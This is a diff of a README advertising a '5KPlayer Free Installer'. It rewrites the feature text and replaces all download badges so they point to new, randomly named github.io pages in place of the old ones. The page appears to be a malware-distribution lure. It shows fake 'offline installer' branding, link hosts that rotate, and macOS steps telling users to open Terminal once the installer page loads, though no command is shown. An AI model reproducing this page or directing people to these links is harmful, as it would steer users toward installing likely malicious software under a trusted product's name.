@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Media+Player-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 5KPlayer Free Installer** — 5KPlayer is a free media player for Windows and macOS that supports 4K, 5K, and 8K video playback along with DVD, Blu-ray, and 360° VR video. Works without internet access, no account required. Full offline installation.
+**💻 5KPlayer Free Installer** — 5KPlayer is a free media player for Windows and macOS supporting 4K, 5K, and 8K video playback, YouTube and other streaming site downloads, AirPlay receiving, and DLNA streaming. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install 5KPlayer](https://img.shields.io/badge/⬇_Install_5KPlayer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install 5KPlayer](https://img.shields.io/badge/⬇_Install_5KPlayer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About 5KPlayer
 
-5KPlayer is a free media player for Windows and macOS that supports 4K, 5K, and 8K video playback along with DVD, Blu-ray, and 360° VR video. Built-in online video downloader supports YouTube, Vimeo, and hundreds of other sites. 5KPlayer also includes AirPlay and DLNA support for streaming media to and from other devices on the local network.
+5KPlayer is a free media player for Windows and macOS supporting 4K, 5K, and 8K video playback, YouTube and other streaming site downloads, AirPlay receiving, and DLNA streaming. It aims to be an all-in-one media playback and streaming solution.
 
 ---
 
 ## ❌ Problem: 5KPlayer is hard to access
 
-- **Bundled Software** — Installation requires care to avoid bundled offers
-- **Downloader Legal Risk** — Downloading copyrighted video content may be legally restricted
-- **Interface Ads** — Free version shows promotional content in the interface
-- **Alternative Options** — VLC or mpv provide cleaner, fully open-source alternatives
+- **Freemium Features** — Some features like hardware decoding and format support require upgrade
+- **Bundled Software Risk** — Some versions historically bundled additional software during installation
+- **Interface Complexity** — Feature-dense interface for users wanting a simple media player
+- **Privacy** — Closed-source player; some privacy-conscious users prefer open-source VLC
 
 ---
 
@@ -61,9 +61,9 @@
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@
 
 <div align="center">
 
-[![⬇ Install 5KPlayer](https://img.shields.io/badge/⬇_Install_5KPlayer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install 5KPlayer](https://img.shields.io/badge/⬇_Install_5KPlayer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@
 
 ---
 
-**5KPlayer Free Installer** — 5KPlayer is a free media player for Windows and macOS that supports 4K, 5K, and 8K video playback along with DVD, Blu-ray, and 360° VR video. Install without internet connection today!
+**5KPlayer Free Installer** — 5KPlayer is a free media player for Windows and macOS supporting 4K, 5K, and 8K video playback, YouTube and other streaming site downloads, AirPlay receiving, and DLNA streaming. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install 5KPlayer](https://img.shields.io/badge/⬇_Install_5KPlayer-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install 5KPlayer](https://img.shields.io/badge/⬇_Install_5KPlayer-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
